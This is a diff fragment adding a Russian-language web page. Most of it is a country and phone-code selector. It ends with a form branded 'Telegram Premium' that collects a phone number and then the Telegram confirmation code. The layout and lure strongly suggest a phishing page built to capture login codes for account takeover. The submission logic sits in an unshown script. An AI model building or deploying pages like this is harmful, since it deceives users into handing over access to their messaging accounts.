+                        <img src="flags/PT.png" alt="Португалия">
+                        <span class="country_name">Португалия</span>
+                    </div>
+                    <div data-country-code="PR" data-phone-code="+1" title="Пуэрто-Рико" class="dc_option">
+                        <img src="flags/PR.png" alt="Пуэрто-Рико">
+                        <span class="country_name">Пуэрто-Рико</span>
+                    </div>
+                    <div data-country-code="RE" data-phone-code="+262" title="Реюньон" class="dc_option">
+                        <img src="flags/RE.png" alt="Реюньон">
+                        <span class="country_name">Реюньон</span>
+                    </div>
+                    <div data-country-code="RU" data-phone-code="+7" title="Россия" class="dc_option">
+                        <img src="flags/RU.png" alt="Россия">
+                        <span class="country_name">Россия</span>
+                    </div>
+                    <div data-country-code="RW" data-phone-code="+250" title="Руанда" class="dc_option">
+                        <img src="flags/RW.png" alt="Руанда">
+                        <span class="country_name">Руанда</span>
+                    </div>
+                    <div data-country-code="RO" data-phone-code="+40" title="Румыния" class="dc_option">
+                        <img src="flags/RO.png" alt="Румыния">
+                        <span class="country_name">Румыния</span>
+                    </div>
+                    <div data-country-code="SV" data-phone-code="+503" title="Сальвадор" class="dc_option">
+                        <img src="flags/SV.png" alt="Сальвадор">
+                        <span class="country_name">Сальвадор</span>
+                    </div>
+                    <div data-country-code="WS" data-phone-code="+685" title="Самоа" class="dc_option">
+                        <img src="flags/WS.png" alt="Самоа">
+                        <span class="country_name">Самоа</span>
+                    </div>
+                    <div data-country-code="SM" data-phone-code="+378" title="Сан-Марино" class="dc_option">
+                        <img src="flags/SM.png" alt="Сан-Марино">
+                        <span class="country_name">Сан-Марино</span>
+                    </div>
+                    <div data-country-code="ST" data-phone-code="+239" title="Сан-Томе и Принсипи" class="dc_option">
+                        <img src="flags/ST.png" alt="Сан-Томе и Принсипи">
+                        <span class="country_name">Сан-Томе и Принсипи</span>
+                    </div>
+                    <div data-country-code="SA" data-phone-code="+966" title="Саудовская Аравия" class="dc_option">
+                        <img src="flags/SA.png" alt="Саудовская Аравия">
+                        <span class="country_name">Саудовская Аравия</span>
+                    </div>
+                    <div data-country-code="SZ" data-phone-code="+268" title="Свазиленд" class="dc_option">
+                        <img src="flags/SZ.png" alt="Свазиленд">
+                        <span class="country_name">Свазиленд</span>
+                    </div>
+                    <div data-country-code="MP" data-phone-code="+1" title="Северные Марианские острова" class="dc_option">
+                        <img src="flags/MP.png" alt="Северные Марианские острова">
+                        <span class="country_name">Северные Марианские острова</span>
+                    </div>
+                    <div data-country-code="SC" data-phone-code="+248" title="Сейшельские острова" class="dc_option">
+                        <img src="flags/SC.png" alt="Сейшельские острова">
+                        <span class="country_name">Сейшельские острова</span>
+                    </div>
+                    <div data-country-code="PM" data-phone-code="+508" title="Сен-Пьер и Микелон" class="dc_option">
+                        <img src="flags/PM.png" alt="Сен-Пьер и Микелон">
+                        <span class="country_name">Сен-Пьер и Микелон</span>
+                    </div>
+                    <div data-country-code="SN" data-phone-code="+221" title="Сенегал" class="dc_option">
+                        <img src="flags/SN.png" alt="Сенегал">
+                        <span class="country_name">Сенегал</span>
+                    </div>
+                    <div data-country-code="VC" data-phone-code="+1" title="Сент-Винсент и Гренадины" class="dc_option">
+                        <img src="flags/VC.png" alt="Сент-Винсент и Гренадины">
+                        <span class="country_name">Сент-Винсент и Гренадины</span>
+                    </div>
+                    <div data-country-code="KN" data-phone-code="+1" title="Сент-Китс и Невис" class="dc_option">
+                        <img src="flags/KN.png" alt="Сент-Китс и Невис">
+                        <span class="country_name">Сент-Китс и Невис</span>
+                    </div>
+                    <div data-country-code="LC" data-phone-code="+1" title="Сент-Люсия" class="dc_option">
+                        <img src="flags/LC.png" alt="Сент-Люсия">
+                        <span class="country_name">Сент-Люсия</span>
+                    </div>
+                    <div data-country-code="RS" data-phone-code="+381" title="Сербия" class="dc_option">
+                        <img src="flags/RS.png" alt="Сербия">
+                        <span class="country_name">Сербия</span>
+                    </div>
+                    <div data-country-code="SG" data-phone-code="+65" title="Сингапур" class="dc_option">
+                        <img src="flags/SG.png" alt="Сингапур">
+                        <span class="country_name">Сингапур</span>
+                    </div>
+                    <div data-country-code="SX" data-phone-code="+1" title="Синт-Мартен" class="dc_option">
+                        <img src="flags/SX.png" alt="Синт-Мартен">
+                        <span class="country_name">Синт-Мартен</span>
+                    </div>
+                    <div data-country-code="SY" data-phone-code="+963" title="Сирия" class="dc_option">
+                        <img src="flags/SY.png" alt="Сирия">
+                        <span class="country_name">Сирия</span>
+                    </div>
+                    <div data-country-code="SK" data-phone-code="+421" title="Словакия" class="dc_option">
+                        <img src="flags/SK.png" alt="Словакия">
+                        <span class="country_name">Словакия</span>
+                    </div>
+                    <div data-country-code="SI" data-phone-code="+386" title="Словения" class="dc_option">
+                        <img src="flags/SI.png" alt="Словения">
+                        <span class="country_name">Словения</span>
+                    </div>
+                    <div data-country-code="US" data-phone-code="+1" title="Соединенные Штаты Америки" class="dc_option">
+                        <img src="flags/US.png" alt="Соединенные Штаты Америки">
+                        <span class="country_name">Соединенные Штаты Америки</span>
+                    </div>
+                    <div data-country-code="SB" data-phone-code="+677" title="Соломоновы Острова" class="dc_option">
+                        <img src="flags/SB.png" alt="Соломоновы Острова">
+                        <span class="country_name">Соломоновы Острова</span>
+                    </div>
+                    <div data-country-code="SO" data-phone-code="+252" title="Сомали" class="dc_option">
+                        <img src="flags/SO.png" alt="Сомали">
+                        <span class="country_name">Сомали</span>
+                    </div>
+                    <div data-country-code="SD" data-phone-code="+249" title="Судан" class="dc_option">
+                        <img src="flags/SD.png" alt="Судан">
+                        <span class="country_name">Судан</span>
+                    </div>
+                    <div data-country-code="SR" data-phone-code="+597" title="Суринам" class="dc_option">
+                        <img src="flags/SR.png" alt="Суринам">
+                        <span class="country_name">Суринам</span>
+                    </div>
+                    <div data-country-code="SL" data-phone-code="+232" title="Сьерра-Леоне" class="dc_option">
+                        <img src="flags/SL.png" alt="Сьерра-Леоне">
+                        <span class="country_name">Сьерра-Леоне</span>
+                    </div>
+                    <div data-country-code="TJ" data-phone-code="+992" title="Таджикистан" class="dc_option">
+                        <img src="flags/TJ.png" alt="Таджикистан">
+                        <span class="country_name">Таджикистан</span>
+                    </div>
+                    <div data-country-code="TH" data-phone-code="+66" title="Таиланд" class="dc_option">
+                        <img src="flags/TH.png" alt="Таиланд">
+                        <span class="country_name">Таиланд</span>
+                    </div>
+                    <div data-country-code="TW" data-phone-code="+886" title="Тайвань" class="dc_option">
+                        <img src="flags/TW.png" alt="Тайвань">
+                        <span class="country_name">Тайвань</span>
+                    </div>
+                    <div data-country-code="TZ" data-phone-code="+255" title="Танзания" class="dc_option">
+                        <img src="flags/TZ.png" alt="Танзания">
+                        <span class="country_name">Танзания</span>
+                    </div>
+                    <div data-country-code="TG" data-phone-code="+228" title="Того" class="dc_option">
+                        <img src="flags/TG.png" alt="Того">
+                        <span class="country_name">Того</span>
+                    </div>
+                    <div data-country-code="TK" data-phone-code="+690" title="Токелау" class="dc_option">
+                        <img src="flags/TK.png" alt="Токелау">
+                        <span class="country_name">Токелау</span>
+                    </div>
+                    <div data-country-code="TO" data-phone-code="+676" title="Тонга" class="dc_option">
+                        <img src="flags/TO.png" alt="Тонга">
+                        <span class="country_name">Тонга</span>
+                    </div>
+                    <div data-country-code="TT" data-phone-code="+1" title="Тринидад и Тобаго" class="dc_option">
+                        <img src="flags/TT.png" alt="Тринидад и Тобаго">
+                        <span class="country_name">Тринидад и Тобаго</span>
+                    </div>
+                    <div data-country-code="TV" data-phone-code="+688" title="Тувалу" class="dc_option">
+                        <img src="flags/TV.png" alt="Тувалу">
+                        <span class="country_name">Тувалу</span>
+                    </div>
+                    <div data-country-code="TN" data-phone-code="+216" title="Тунис" class="dc_option">
+                        <img src="flags/TN.png" alt="Тунис">
+                        <span class="country_name">Тунис</span>
+                    </div>
+                    <div data-country-code="TM" data-phone-code="+993" title="Туркменистан" class="dc_option">
+                        <img src="flags/TM.png" alt="Туркменистан">
+                        <span class="country_name">Туркменистан</span>
+                    </div>
+                    <div data-country-code="TR" data-phone-code="+90" title="Турция" class="dc_option">
+                        <img src="flags/TR.png" alt="Турция">
+                        <span class="country_name">Турция</span>
+                    </div>
+                    <div data-country-code="UG" data-phone-code="+256" title="Уганда" class="dc_option">
+                        <img src="flags/UG.png" alt="Уганда">
+                        <span class="country_name">Уганда</span>
+                    </div>
+                    <div data-country-code="UZ" data-phone-code="+998" title="Узбекистан" class="dc_option">
+                        <img src="flags/UZ.png" alt="Узбекистан">
+                        <span class="country_name">Узбекистан</span>
+                    </div>
+                    <div data-country-code="UA" data-phone-code="+380" title="Украина" class="dc_option">
+                        <img src="flags/UA.png" alt="Украина">
+                        <span class="country_name">Украина</span>
+                    </div>
+                    <div data-country-code="WF" data-phone-code="+681" title="Уоллис и Футуна" class="dc_option">
+                        <img src="flags/WF.png" alt="Уоллис и Футуна">
+                        <span class="country_name">Уоллис и Футуна</span>
+                    </div>
+                    <div data-country-code="UY" data-phone-code="+598" title="Уругвай" class="dc_option">
+                        <img src="flags/UY.png" alt="Уругвай">
+                        <span class="country_name">Уругвай</span>
+                    </div>
+                    <div data-country-code="FO" data-phone-code="+298" title="Фарерские острова" class="dc_option">
+                        <img src="flags/FO.png" alt="Фарерские острова">
+                        <span class="country_name">Фарерские острова</span>
+                    </div>
+                    <div data-country-code="FJ" data-phone-code="+679" title="Фиджи" class="dc_option">
+                        <img src="flags/FJ.png" alt="Фиджи">
+                        <span class="country_name">Фиджи</span>
+                    </div>
+                    <div data-country-code="PH" data-phone-code="+63" title="Филиппины" class="dc_option">
+                        <img src="flags/PH.png" alt="Филиппины">
+                        <span class="country_name">Филиппины</span>
+                    </div>
+                    <div data-country-code="FI" data-phone-code="+358" title="Финляндия" class="dc_option">
+                        <img src="flags/FI.png" alt="Финляндия">
+                        <span class="country_name">Финляндия</span>
+                    </div>
+                    <div data-country-code="FK" data-phone-code="+500" title="Фолклендские острова" class="dc_option">
+                        <img src="flags/FK.png" alt="Фолклендские острова">
+                        <span class="country_name">Фолклендские острова</span>
+                    </div>
+                    <div data-country-code="FR" data-phone-code="+33" title="Франция" class="dc_option">
+                        <img src="flags/FR.png" alt="Франция">
+                        <span class="country_name">Франция</span>
+                    </div>
+                    <div data-country-code="GF" data-phone-code="+594" title="Французская Гвиана" class="dc_option">
+                        <img src="flags/GF.png" alt="Французская Гвиана">
+                        <span class="country_name">Французская Гвиана</span>
+                    </div>
+                    <div data-country-code="PF" data-phone-code="+689" title="Французская Полинезия" class="dc_option">
+                        <img src="flags/PF.png" alt="Французская Полинезия">
+                        <span class="country_name">Французская Полинезия</span>
+                    </div>
+                    <div data-country-code="HR" data-phone-code="+385" title="Хорватия" class="dc_option">
+                        <img src="flags/HR.png" alt="Хорватия">
+                        <span class="country_name">Хорватия</span>
+                    </div>
+                    <div data-country-code="CF" data-phone-code="+236" title="ЦАР" class="dc_option">
+                        <img src="flags/CF.png" alt="ЦАР">
+                        <span class="country_name">ЦАР</span>
+                    </div>
+                    <div data-country-code="TD" data-phone-code="+235" title="Чад" class="dc_option">
+                        <img src="flags/TD.png" alt="Чад">
+                        <span class="country_name">Чад</span>
+                    </div>
+                    <div data-country-code="ME" data-phone-code="+382" title="Черногория" class="dc_option">
+                        <img src="flags/ME.png" alt="Черногория">
+                        <span class="country_name">Черногория</span>
+                    </div>
+                    <div data-country-code="CZ" data-phone-code="+420" title="Чехия" class="dc_option">
+                        <img src="flags/CZ.png" alt="Чехия">
+                        <span class="country_name">Чехия</span>
+                    </div>
+                    <div data-country-code="CL" data-phone-code="+56" title="Чили" class="dc_option">
+                        <img src="flags/CL.png" alt="Чили">
+                        <span class="country_name">Чили</span>
+                    </div>
+                    <div data-country-code="CH" data-phone-code="+41" title="Швейцария" class="dc_option">
+                        <img src="flags/CH.png" alt="Швейцария">
+                        <span class="country_name">Швейцария</span>
+                    </div>
+                    <div data-country-code="SE" data-phone-code="+46" title="Швеция" class="dc_option">
+                        <img src="flags/SE.png" alt="Швеция">
+                        <span class="country_name">Швеция</span>
+                    </div>
+                    <div data-country-code="LK" data-phone-code="+94" title="Шри-Ланка" class="dc_option">
+                        <img src="flags/LK.png" alt="Шри-Ланка">
+                        <span class="country_name">Шри-Ланка</span>
+                    </div>
+                    <div data-country-code="EC" data-phone-code="+593" title="Эквадор" class="dc_option">
+                        <img src="flags/EC.png" alt="Эквадор">
+                        <span class="country_name">Эквадор</span>
+                    </div>
+                    <div data-country-code="GQ" data-phone-code="+240" title="Экваториальная Гвинея" class="dc_option">
+                        <img src="flags/GQ.png" alt="Экваториальная Гвинея">
+                        <span class="country_name">Экваториальная Гвинея</span>
+                    </div>
+                    <div data-country-code="ER" data-phone-code="+291" title="Эритрея" class="dc_option">
+                        <img src="flags/ER.png" alt="Эритрея">
+                        <span class="country_name">Эритрея</span>
+                    </div>
+                    <div data-country-code="EE" data-phone-code="+372" title="Эстония" class="dc_option">
+                        <img src="flags/EE.png" alt="Эстония">
+                        <span class="country_name">Эстония</span>
+                    </div>
+                    <div data-country-code="ET" data-phone-code="+251" title="Эфиопия" class="dc_option">
+                        <img src="flags/ET.png" alt="Эфиопия">
+                        <span class="country_name">Эфиопия</span>
+                    </div>
+                    <div data-country-code="ZA" data-phone-code="+27" title="ЮАР" class="dc_option">
+                        <img src="flags/ZA.png" alt="ЮАР">
+                        <span class="country_name">ЮАР</span>
+                    </div>
+                    <div data-country-code="KR" data-phone-code="+82" title="Южная Корея" class="dc_option">
+                        <img src="flags/KR.png" alt="Южная Корея">
+                        <span class="country_name">Южная Корея</span>
+                    </div>
+                    <div data-country-code="SS" data-phone-code="+211" title="Южный Судан" class="dc_option">
+                        <img src="flags/SS.png" alt="Южный Судан">
+                        <span class="country_name">Южный Судан</span>
+                    </div>
+                    <div data-country-code="JM" data-phone-code="+1876" title="Ямайка" class="dc_option">
+                        <img src="flags/JM.png" alt="Ямайка">
+                        <span class="country_name">Ямайка</span>
+                    </div>
+                    <div data-country-code="JP" data-phone-code="+81" title="Япония" class="dc_option">
+                        <img src="flags/JP.png" alt="Япония">
+                        <span class="country_name">Япония</span>
+                    </div>
+                </div>
+                <span id="choosen_country" data-country-code="" data-phone-code="">
+                    <img src="" alt="">
+                    <span class="country_name"></span>
+                </span>
+                <input type="text" name="" id="phone_number">
+                <span id="send_code" class="btn_primary">Далее</span>
+            </div>
+            <div id="form_get_code" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Мы выслали вам сообщение в Telegram с кодом подтверждения</div>
+                <input type="number" placeholder="Код" name="" id="code">                 
+            </div>
+            <div id="loading" class="form">
+                <img src="media/91.gif" alt="">
+            </div>           
+        </div>
+        <div class="footer">
+            <a id="to_modal_phone_error" href="#ex1" rel="modal:open">Open Modal</a>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
+    <script src="mask.js"></script>
+    <script src="script.js"></script>    
+</body>
+</html>
